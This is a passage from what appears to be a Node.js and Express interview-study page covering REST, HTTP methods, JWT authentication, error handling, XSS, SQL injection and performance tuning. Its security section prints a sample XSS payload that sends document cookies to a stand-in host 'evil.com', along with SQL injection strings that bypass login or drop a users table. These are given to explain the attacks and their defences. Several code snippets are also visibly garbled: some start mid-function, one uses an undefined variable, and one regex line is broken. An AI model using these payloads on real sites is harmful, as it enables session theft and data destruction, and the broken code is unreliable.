  const { q, page = 1 } = req.query;  // from ?q=node&page=2
  res.json({ q, page });
});

// router.param() — pre-process a param before routes
app.param("id", async (req, res, next, id) => {
  const user = await User.findById(id);
  if (!user) return res.status(404).json({ error: "Not found" });
  req.user = user; // attach to req for all routes using :id
  next();
});

Q.01 What are Template Engines in Express.js? ⭐ Key Concept ▼

A template engine allows you to generate dynamic HTML pages on the server by embedding JavaScript logic and data inside an HTML-like template file. When a request comes in, the server processes the template — replacing variables and executing logic — and sends back a complete HTML page to the browser.

Template engines are used for server-side rendering (SSR) — where HTML is generated on the server rather than in the browser. This is the traditional MVC (Model-View-Controller) approach. In modern development, many apps use React/Vue for the frontend instead, but template engines are still widely used for admin panels, email templates, and simple web apps.

Express itself has no built-in templating — you pick and configure a template engine separately. Express provides two settings: view engine (which engine to use) and views (where template files are stored).

Q.01 What is REST and RESTful API? ⭐ Key Concept ▼

REST (Representational State Transfer) is an architectural style for designing networked applications. It is not a protocol — it is a set of design constraints that make an API scalable, stateless, and easy to use. A RESTful API follows REST principles, uses HTTP as the communication protocol, represents data as resources (identified by URLs), and uses standard HTTP methods to perform operations on them.

  • Resource — any data object (user, product, order). Identified by a URL like /api/users/42.
  • Representation — the format sent over the network (usually JSON).
  • Stateless — each request must contain all information needed. Server stores no client session state.
  • Uniform Interface — consistent URL patterns and HTTP methods across all resources.

  • 1. Stateless — each request includes all needed info (auth token, params). No server session storage. Advantage: any server handles any request; easy horizontal scaling.

Q.01 What are HTTP Verbs and HTTP methods? ⭐ Key Concept ▼

HTTP methods (also called HTTP verbs) define the intended action on a resource. Each verb has a semantic meaning agreed upon by clients and servers.

  • GET — retrieve/read. No body. Safe and idempotent.
  • POST — create or submit. Has a body. Not idempotent.
  • PUT — replace entire resource. Has a body. Idempotent.
  • PATCH — partial update. Has a body. Idempotent.
  • DELETE — remove a resource. Idempotent.
  • HEAD — same as GET but returns only headers. Checks if resource exists.
  • OPTIONS — asks what methods are allowed. Used by browsers for CORS preflight.
javascript
app.get("/users",        handler); // retrieve
app.post("/users",       handler); // create
app.put("/users/:id",    handler); // full replace
app.patch("/users/:id",  handler); // partial update
app.delete("/users/:id", handler); // remove
app.head("/users/:id",   handler); // headers only
app.options("/users",    handler); // CORS preflight
Q.02 What are GET, POST, PUT and DELETE HTTP methods? ⭐ Key Concept ▼
  • GET — Read data. No body. Cacheable. Calling multiple times has no side effects. Example: fetch a user profile.
  • POST — Create a new resource. Has a body. Calling it twice creates two records. Example: create a user account.
  • PUT — Replace an entire resource with provided data. Omitting a field removes it. Calling multiple times with same data gives same result. Example: replace an entire user profile.
  • DELETE — Remove a resource. Subsequent calls return 404 (resource already gone). Example: delete a post.
javascript
// GET — read
app.get("/api/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) return res.status(404).json({ error: "Not found" });
  res.json(user);
});
// POST — create
app.post("/api/users", async (req, res) => {
  const user = await User.create(req.body);
  res.status(201).json(user);
});
// PUT — full replace
app.put("/api/users/:id", async (req, res) => {
  const user = await User.findByIdAndUpdate(req.params.id, req.body, { overwrite: true, new: true });
  res.json(user);
});
// DELETE — remove
app.delete("/api/users/:id", async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.status(204).send();
});
Q.03 What is the difference between PUT and PATCH methods? ⭐ Key Concept ▼
  • PUT — replaces the entire resource. You must send all fields. Any field you omit gets removed or reset. Think: "replace this with exactly what I send".
  • PATCH — updates only the fields you provide. Fields you omit remain unchanged. Think: "only change what I tell you to change". More commonly used in practice.
javascript
// PUT — full replace, ALL fields required
app.put("/users/:id", async (req, res) => {
  // Must send: name, email, role, age — omitting any removes it
  const user = await User.findByIdAndUpdate(
    req.params.id, req.body, { overwrite: true, new: true }
  );
  res.json(user);
});

// PATCH — partial update, only changed fields
app.patch("/users/:id", async (req, res) => {
  // Send only: { name: "Arun Kumar" } — email, role, age unchanged
  const user = await User.findByIdAndUpdate(
    req.params.id, { $set: req.body }, { new: true }
  );
  res.json(user);
});
Q.04 Explain the concept of Idempotence in RESTful APIs. ⭐ Key Concept ▼

An operation is idempotent if making the same request multiple times produces the same result as making it once. It matters for reliability — if a network failure causes a client to retry, an idempotent operation won't cause unwanted duplicate effects.

  • Idempotent: GET, PUT, PATCH, DELETE
  • NOT idempotent: POST — calling twice creates two records
javascript
// POST — NOT idempotent (each call creates a new order)
// POST /orders x3 → 3 separate orders created ❌

  const key      = req.headers["idempotency-key"];
  const existing = await Payment.findOne({ idempotencyKey: key });
  if (existing) return res.json(existing); // return cached result
  const payment  = await Payment.create({ ...req.body, idempotencyKey: key });
  res.status(201).json(payment);
});
Q.05 What is the role of status codes in RESTful APIs? ⭐ Key Concept ▼

HTTP status codes are 3-digit numbers in every response that tell the client the outcome of the request. Using the correct status codes is essential for a well-designed REST API.

  • 2xx Success: 200 OK, 201 Created, 204 No Content
  • 3xx Redirection: 301 Moved Permanently, 304 Not Modified
  • 4xx Client Errors: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Unprocessable Entity, 429 Too Many Requests
  • 5xx Server Errors: 500 Internal Server Error, 503 Service Unavailable

Q.01 What is CORS in RESTful APIs? ⭐ Key Concept ▼

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks web pages from making requests to a different origin than the one that served the page — unless the server explicitly allows it. An origin is protocol + domain + port. If any differ, the browser blocks the request. CORS only affects browser requests — Postman, curl, and server-to-server calls are never blocked.

Q.01 What are Authentication and Authorization? ⭐ Key Concept ▼

Authentication — verifying who you are. Validates credentials (email/password, token). Fails with 401 Unauthorized.

Authorization — verifying what you are allowed to do. Happens AFTER authentication. Fails with 403 Forbidden.

Think of it like a building: Authentication is showing your ID at the entrance. Authorization is whether your ID gives access to the 5th floor.

javascript
// Authentication — verify identity
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch { res.status(401).json({ error: "Invalid token" }); }
}

// Authorization — verify permissions
function isAdmin(req, res, next) {
  if (req.user?.role !== "admin")
    return res.status(403).json({ error: "Forbidden" });
  next();
}

app.delete("/api/users/:id", authenticate, isAdmin, handler);

  • OAuth 2.0 — industry standard for third-party auth ("Login with Google/GitHub"). Tokens from a separate authorization server.

function basicAuth(req, res, next) {
  const header = req.headers.authorization;
  if (!header?.startsWith("Basic "))
    return res.status(401).json({ error: "Missing credentials" });

  const [username, password] = decoded.split(":");

  if (username !== process.env.ADMIN_USER || password !== process.env.ADMIN_PASS)
    return res.status(401).json({ error: "Invalid credentials" });
  next();
}

Q.05 What is the role of Hashing and Salt in securing passwords? ⭐ Key Concept ▼

Hashing — a one-way transformation converting a password into a fixed-length string. Cannot be reversed — you verify by hashing the input and comparing to the stored hash.

Salt — a random unique string added to each password BEFORE hashing. Without salt, identical passwords produce identical hashes — attackers can use precomputed rainbow tables to crack them instantly. Salt makes every hash unique, defeating rainbow table attacks.

javascript
// Without salt — same password = same hash (vulnerable)

// Always "ef92b778..." — rainbow table can crack ❌

// bcrypt — salt built in, unique hash every time
const hash1 = await bcrypt.hash("pass123", 12);
const hash2 = await bcrypt.hash("pass123", 12);
// hash1 !== hash2 — same password, different hashes ✅
// Format: "$2b$12$SALT...HASH" — salt stored inside hash

  const { name, email, password } = req.body;
  const existing = await User.findOne({ email });
  if (existing) return res.status(409).json({ error: "Email taken" });
  const hashed = await bcrypt.hash(password, 12);
  const user   = await User.create({ name, email, password: hashed });
  res.status(201).json({ id: user._id, name, email });
});

// Verify on login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  const user    = await User.findOne({ email });
  const isValid = user && await bcrypt.compare(password, user.password);
  if (!isValid) return res.status(401).json({ error: "Invalid credentials" });
  const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: "7d" });
  res.json({ token });
});

API Key Authentication issues a unique secret key to each client. The client sends it with every request via a header or query param. The server looks it up in the database to identify and authenticate the client. Best for server-to-server communication or developer APIs. Never expose in frontend code.

  if (!apiKey) return res.status(401).json({ error: "Invalid key" });

  next();
}

Q.08 What is Token-Based and JWT Authentication? ⭐ Key Concept ▼

Token-based auth — server issues a signed token after login. Client stores it and sends with every request. Server verifies the signature — no DB lookup needed. Stateless and scalable.

JWT (JSON Web Token) — the most popular token format. Self-contained — encodes user info (id, role) inside, signed with a secret key. Verified mathematically without hitting the database.

javascript
const jwt = require("jsonwebtoken");

// Sign — create token on login
const token = jwt.sign(
  { id: user._id, email: user.email, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: "7d" }
);

// Verify — on each protected request
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token" });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
}
Q.09 What are the parts of a JWT token? ⭐ Key Concept ▼

A JWT has three Base64URL-encoded parts separated by dots: HEADER.PAYLOAD.SIGNATURE

  • Header — token type (JWT) and signing algorithm (HS256, RS256).
  • Payload (Claims) — the data: user id, role, expiry (exp), issued-at (iat). NOT encrypted — anyone can decode it. Never store passwords or sensitive data here.
  • Signature — HMAC of header + payload + secret. Used to verify the token hasn't been tampered with. If any part changes, signature becomes invalid.

  • Authorization Header (recommended) — Authorization: Bearer TOKEN. Standard, widely used, manually attached by JS.
  • HttpOnly Cookie (most secure) — set by server, sent automatically, inaccessible to JS — XSS attacks cannot steal it. Requires CSRF protection.

Q.01 What is Error Handling? In how many ways can you do it in Node.js? ⭐ Key Concept ▼

Error handling is anticipating, detecting, and recovering from errors so your app fails gracefully instead of crashing. In Node.js, unhandled errors crash the entire process — losing all in-flight requests.

4 main error handling patterns:

  • 1. try/catch/finally — for synchronous code and async/await
  • 2. Error-First Callbacks — traditional Node.js pattern (error is first argument)
  • 3. Promise .catch() — for Promise chains
  • 4. Global handlers — process.on("uncaughtException") / process.on("unhandledRejection") as safety net
javascript
// 1. try/catch
try { JSON.parse(raw); } catch (err) { console.error(err); }

// 2. Error-first callback
fs.readFile("file.txt", (err, data) => {
  if (err) return handleError(err);
  process(data);
});

// 3. Promise .catch()
fetch("/api").then(r => r.json()).catch(console.error);

// 4. Global safety net
process.on("uncaughtException",  err => { console.error(err); process.exit(1); });
process.on("unhandledRejection", reason => console.error(reason));
Q.02 How to handle errors in synchronous operations using try-catch-finally? ⭐ Key Concept ▼

try runs the code, catch handles thrown errors, finally always runs regardless — perfect for cleanup like hiding spinners or closing connections.

javascript
try {
  const data = JSON.parse(invalidJSON);
  processData(data);
} catch (err) {
  if (err instanceof SyntaxError) showError("Invalid JSON");
  else throw err; // re-throw unknown errors
} finally {
  hideSpinner(); // always runs
}

// Custom error class
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
    this.statusCode = 400;
  }
}

// In Express route
app.post("/users", async (req, res, next) => {
  try {
    if (!req.body.email) throw new ValidationError("Email required", "email");
    const user = await User.create(req.body);
    res.status(201).json(user);
  } catch (err) { next(err); }
});
Q.03 What is Error-First Callbacks? ⭐ Key Concept ▼

A Node.js convention where the first argument of any callback is always an error object. If success: first arg is null, result is second. If error: first arg is the Error, result is undefined. All Node.js built-in async APIs (fs, http) use this pattern.

javascript
// Built-in — error first
fs.readFile("file.txt", "utf8", (err, data) => {
  if (err) return console.error(err); // always return after error!
  console.log(data);
});

// Write your own error-first callback function
function divide(a, b, callback) {
  if (b === 0) return callback(new Error("Division by zero"));
  callback(null, a / b); // null = no error
}
divide(10, 2, (err, result) => {
  if (err) return console.error(err.message);
  console.log(result); // 5
});

// Convert callback to Promise
const readFile = require("util").promisify(fs.readFile);
const data     = await readFile("file.txt", "utf8");
Q.04 How to handle errors using Promises? ⭐ Key Concept ▼

Use .catch() at the end of Promise chains. A rejection anywhere in the chain propagates to the nearest .catch(). Always chain a .catch() — unhandled rejections crash Node in newer versions.

javascript
// Chain .catch() at the end
fetch("/api/users")
  .then(res => res.json())
  .then(data => render(data))
  .catch(err => showError(err.message))
  .finally(() => hideSpinner());

// Per-step fallback
fetchUser(id)
  .catch(() => ({ name: "Guest" }))  // fallback on failure
  .then(user => render(user));

// Promise.allSettled — handle each result individually
Promise.allSettled([fetchUsers(), fetchPosts()])
  .then(results => results.forEach(r => {
    if (r.status === "fulfilled") render(r.value);
    else logError(r.reason);
  }));
Q.05 How to handle errors while using async/await? ⭐ Key Concept ▼

Wrap in try/catch/finally — when an awaited Promise rejects, it throws the error which catch handles. Use an asyncHandler wrapper in Express to eliminate repetitive try/catch in every route.

javascript
// Standard pattern
async function loadUser(id) {
  try {
    const res  = await fetch(`/api/users/${id}`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const user = await res.json();
    render(user);
  } catch (err) {
    showError(err.message);
  } finally {
    hideSpinner();
  }
}

// asyncHandler — eliminates try/catch per route
const asyncHandler = fn => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get("/users", asyncHandler(async (req, res) => {
  const users = await User.find(); // errors auto-forwarded to next(err)
  res.json(users);
}));

Q.01 What is XSS (Cross-Site Scripting) attack? ⭐ Key Concept ▼

XSS (Cross-Site Scripting) is one of the most common web security vulnerabilities. It occurs when an attacker injects malicious JavaScript into a trusted website, which then runs in other users' browsers. Since the script appears to come from a trusted domain, the browser executes it with full privileges — it can steal cookies, session tokens, redirect users, or capture keystrokes.

Three types of XSS:

  • Stored XSS — malicious script is saved in the database (e.g., in a comment) and served to every user who views that page. Most dangerous type.
  • Reflected XSS — malicious script is in a URL parameter. When the server reflects it back in the response without sanitisation, it runs in the victim's browser. Usually delivered via phishing links.
  • DOM-based XSS — attack happens entirely client-side. Malicious data from the URL is read by JS and injected into the DOM without sanitisation.
javascript
// How XSS happens — unsanitised user input in HTML
// User submits: <script>fetch("evil.com?c="+document.cookie)</script>
// Server saves it. Every visitor runs the script — attacker steals cookies.

// DOM-based XSS — unsafe innerHTML
const query = location.search; // ?q=<script>stealCookies()</script>
document.getElementById("results").innerHTML = `Results for: ${query}`;
// ❌ Script tag parsed and executed!

// Safe alternative — use textContent
document.getElementById("results").textContent = query; // ✅ plain text only
Q.02 How to prevent XSS attacks? What is the sanitize-html module? ⭐ Key Concept ▼

XSS prevention requires a layered approach — no single fix is enough:

  • Escape output — convert special HTML characters (< > & " ') to their HTML entities before rendering. React does this by default for JSX expressions.
  • Sanitize HTML input — if you must allow HTML (rich text editor), strip dangerous tags and attributes using sanitize-html or DOMPurify.
  • Content Security Policy (CSP) — HTTP header that tells browsers which script sources are trusted. Blocks inline scripts and scripts from untrusted domains.
  • HttpOnly cookies — makes cookies inaccessible to JavaScript, so even if XSS occurs, tokens can't be stolen.
  • Validate and reject suspicious input — reject input containing <script> tags on the server.

sanitize-html is an npm package that parses HTML and strips out dangerous tags and attributes while keeping safe ones (like <b>, <p>, <a>). You define an allowlist of permitted tags and attributes.

bash
npm install sanitize-html helmet
javascript
const sanitizeHtml = require("sanitize-html");
const helmet       = require("helmet");

// 1. Helmet — sets security headers including CSP
app.use(helmet());
// Adds: Content-Security-Policy, X-XSS-Protection, X-Frame-Options etc.

// 2. sanitize-html — strip dangerous tags, keep safe ones
const dirtyHTML = '<p>Hello</p><script>stealCookies()</script><b>World</b>';

const clean = sanitizeHtml(dirtyHTML, {
  allowedTags:       ["p", "b", "i", "em", "strong", "a", "ul", "li"],
  allowedAttributes: { "a": ["href", "target"] },
});
// clean = '<p>Hello</p><b>World</b>' — script tag removed ✅

// Use in route — sanitize before saving to DB
app.post("/comments", async (req, res) => {
  const safeContent = sanitizeHtml(req.body.content, {
    allowedTags: ["b", "i", "p"]
  });
  const comment = await Comment.create({ content: safeContent });
  res.status(201).json(comment);
});

// 3. Escape HTML manually (for non-HTML contexts)
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/"&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
Q.03 What is SQL Injection attack? ⭐ Key Concept ▼

SQL Injection is an attack where malicious SQL code is inserted into user input that is directly concatenated into a database query. When executed, the injected SQL manipulates the query in unintended ways — allowing attackers to bypass authentication, read all data, modify or delete records, or even take control of the database server.

javascript
// Vulnerable — user input concatenated directly into SQL query
const username = req.body.username; // attacker enters: admin'--
const password = req.body.password;

const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
// With input "admin'--" the query becomes:
// SELECT * FROM users WHERE username='admin'--' AND password='anything'
// The -- comments out password check → attacker logs in as admin! ❌

// Destructive injection: '; DROP TABLE users; --
// SELECT * FROM users WHERE name=''; DROP TABLE users; --'
// Deletes the entire users table! ❌
Q.04 How do you prevent SQL injection attacks in Node? ⭐ Key Concept ▼
  • Parameterised queries / Prepared Statements — the most important fix. Values are passed separately from the SQL structure — the driver escapes them automatically. Injection becomes impossible.
  • ORM (Mongoose, Prisma, Sequelize) — abstracts raw SQL and builds safe parameterised queries automatically.
  • Input validation — reject invalid formats early before they reach the database.
  • Principle of least privilege — the DB user your app connects as should only have SELECT/INSERT/UPDATE — no DROP, no GRANT.
  • Never expose raw error messages — DB errors reveal schema structure. Return generic messages to clients.
javascript
// ❌ Vulnerable — string concatenation
db.query(`SELECT * FROM users WHERE username='${username}'`);

// ✅ Parameterised query (mysql2 / pg)
const [rows] = await db.query(
  "SELECT * FROM users WHERE username = ? AND password = ?",
  [username, password] // values passed separately — escaped automatically
);

// ✅ Mongoose ORM — no raw SQL, injection-safe
const user = await User.findOne({ username, password });

// ✅ Prisma ORM
const user = await prisma.user.findUnique({ where: { username } });

// ✅ Input validation — reject suspicious patterns
if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
  return res.status(400).json({ error: "Invalid username" });
}

// ❌ res.json({ error: err.message }) — reveals table names
// ✅ res.status(500).json({ error: "Something went wrong" })
Q.05 How can you improve the performance of a Node.js application? ⭐ Key Concept ▼
  • Use async/non-blocking code everywhere — never use sync methods (readFileSync, etc.) in request handlers. They block the event loop and freeze all other requests.
  • Cluster module — spawn one worker process per CPU core to utilise all available CPU power.
  • Caching — cache frequent database queries or API responses in memory (Redis, node-cache). Avoid hitting the DB for the same data repeatedly.
  • Compression — gzip/brotli compress HTTP responses with the compression middleware to reduce payload size.
  • Offload CPU-heavy tasks — use Worker Threads or child_process for CPU-intensive work to keep the main thread free.
  • Database optimisation — add indexes on frequently queried fields, use projection (select only needed fields), paginate large result sets.
  • Connection pooling — reuse database connections instead of opening a new one per request.
  • Load balancer + Nginx — put Nginx in front to serve static files, handle SSL, and distribute traffic across Node instances.
javascript
// 1. Cluster — use all CPU cores
const cluster = require("cluster");
const os      = require("os");
if (cluster.isMaster()) {
  os.cpus().forEach(() => cluster.fork());
  cluster.on("exit", () => cluster.fork()); // restart crashed workers
} else {
  require("./app").listen(3000);
}

// 2. Response compression
const compression = require("compression");
app.use(compression()); // gzip all responses automatically

// 3. Simple in-memory cache
const cache = new Map();
app.get("/api/products", async (req, res) => {
  if (cache.has("products")) return res.json(cache.get("products"));
  const products = await Product.find();
  cache.set("products", products);
  setTimeout(() => cache.delete("products"), 60000); // expire after 1 min
  res.json(products);
});

// 4. DB index for performance (Mongoose)
const userSchema = new mongoose.Schema({
  email: { type: String, index: true },  // indexed — fast lookup
  name:  { type: String }
});

// 5. Projection — only fetch needed fields
await User.find({}, "name email -_id"); // exclude _id, skip other fields

// 6. Never block event loop
// ❌ Sync in request handler
app.get("/bad", (req, res) => {
  const data = fs.readFileSync("big.json"); // blocks all requests ❌
  res.json(data);
});
// ✅ Async always
app.get("/good", async (req, res) => {
  const data = await fs.promises.readFile("big.json"); // non-blocking ✅
  res.json(data);
});
